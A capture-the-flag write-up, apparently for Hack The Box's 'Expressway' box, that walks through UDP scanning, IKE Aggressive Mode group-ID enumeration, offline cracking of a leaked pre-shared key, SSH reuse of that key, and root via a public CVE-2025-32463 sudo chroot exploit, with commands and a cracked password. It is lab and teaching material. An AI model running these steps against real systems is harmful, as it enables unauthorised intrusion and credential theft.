@@ -1,0 +1,101 @@
+Title: Expressway
+Tag: HTB
+Date: 2025-01-01
+
+# Overview
+
+Expressway was a Linux box whose only reachable TCP service was SSH, with the real entry point sitting on UDP: an IPsec/IKE VPN endpoint on port 500. Enumerating IKE group IDs against a wordlist identified a valid VPN group name, and switching the handshake to IKE Aggressive Mode against that group leaked a crackable Pre-Shared Key hash along with the VPN identity's FQDN. Cracking the PSK offline recovered a password that doubled as valid SSH credentials for a system account. Root privilege escalation then abused a public exploit for a recent sudo chroot vulnerability.
+
+## Recon
+
+```
+> nmap -T4 -p- --min-rate 2000 10.10.11.87
+22/tcp open  ssh
+
+> nmap -sC -sV -p22 10.10.11.87
+22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)
+```
+
+No public SSH exploits for this version worked. With TCP recon exhausted, a full UDP port sweep was run, surfacing an IPsec/IKE service:
+
+```
+> nmap -sU -T4 -p- --min-rate 2000 10.10.11.87
+500/udp open  isakmp
+
+> nmap -sU -sC -sV -p500 10.10.11.87
+500/udp open  isakmp?
+| ike-version:
+|   attributes:
+|     XAUTH
+|_    Dead Peer Detection v1.0
+```
+
+## IKE VPN Enumeration
+
+A Main Mode handshake against the IKE service with `ike-scan` confirmed a responsive VPN endpoint using 3DES, SHA1, Diffie-Hellman group 2 (modp1024), and PSK-based authentication:
+
+```
+> ike-scan -M 10.10.11.87
+10.10.11.87     Main Mode Handshake returned
+        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
+        VID=09002689dfd6b712 (XAUTH)
+        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
+```
+
+Since a single handshake was returned rather than a notify message, no protocol-level brute forcing was needed to get a response. An implementation fingerprinting attempt with `--showbackoff` did not match any known signature.
+
+## IKE Aggressive Mode - Group ID Enumeration
+
+PSK-based IKE deployments commonly require a group/identity name before Aggressive Mode will proceed. Iterating over a wordlist of common IKE group IDs and checking for a returned Aggressive Mode handshake identified several valid group names accepted by the endpoint:
+
+```
+> while read line; do
+    ( echo "Found ID: $line" && sudo ike-scan -M -A -n $line 10.10.11.87 ) | grep -B14 "1 returned handshake" | grep "Found ID:"
+done < /usr/share/wordlists/seclists/Miscellaneous/ike-groupid.txt
+Found ID: ez
+Found ID: 3000
+Found ID: 5000
+Found ID: abc
+Found ID: ABC
+Found ID: ASA_VPN
+```
+
+## Cracking the PSK Hash
+
+Running Aggressive Mode against the `ez` group ID and capturing the exchange for offline cracking revealed the VPN identity as an FQDN-style username along with a crackable PSK hash:
+
+```
+> ike-scan -M -A -n ez --pskcrack=hash.txt 10.10.11.87
+10.10.11.87     Aggressive Mode Handshake returned
+        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
+        VID=09002689dfd6b712 (XAUTH)
+        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
+```
+
+Cracking the captured hash against rockyou.txt with hashcat recovered the PSK:
+
+```
+> hashcat -a 0 hash.txt rockyou.txt
+freakingrockstarontheroad
+```
+
+## Foothold - SSH as ike
+
+The IKE identity (`ike@expressway.htb`) suggested a matching system account, and the cracked PSK worked directly as its SSH password.
+
+```
+> ssh ike@10.10.11.87
+```
+
+This granted a user shell and access to the user flag.
+
+## Privilege Escalation - Sudo Chroot Vulnerability (CVE-2025-32463)
+
+Running linpeas from the `ike` shell flagged `/usr/sbin/chroot` as worth investigating. CVE-2025-32463 is a vulnerability in sudo's `--chroot` (`-R`) option, where sudo can be made to load NSS configuration (`/etc/nsswitch.conf`) from an attacker-controlled directory when a chroot path is supplied, allowing a local user to load an attacker-supplied shared library and escalate to root. A public proof-of-concept for this issue, `CVE-2025-32463_chwoot`, was used directly: the relevant shell script was copied over with its Docker-specific setup removed, and running it produced a root shell.
+
+## Takeaways
+
+- Attack surface isn't limited to TCP. A full UDP port sweep is necessary to catch services like IPsec/IKE VPN endpoints on UDP/500 that a TCP-only scan will completely miss.
+- IKE deployments that accept Aggressive Mode will leak a crackable PSK exchange hash, along with the VPN identity, before any authentication actually completes, and valid group/identity names can be discovered by brute forcing against common wordlists.
+- A cracked VPN Pre-Shared Key can be more than just VPN access. Here it doubled as the plaintext password for a real system account, since the operator had reused the same value in both places.
+- Recently disclosed local privilege escalation CVEs affecting common system utilities (like sudo's `--chroot` option in CVE-2025-32463) are worth checking for explicitly during enumeration, since public exploit code is often available almost immediately after disclosure.
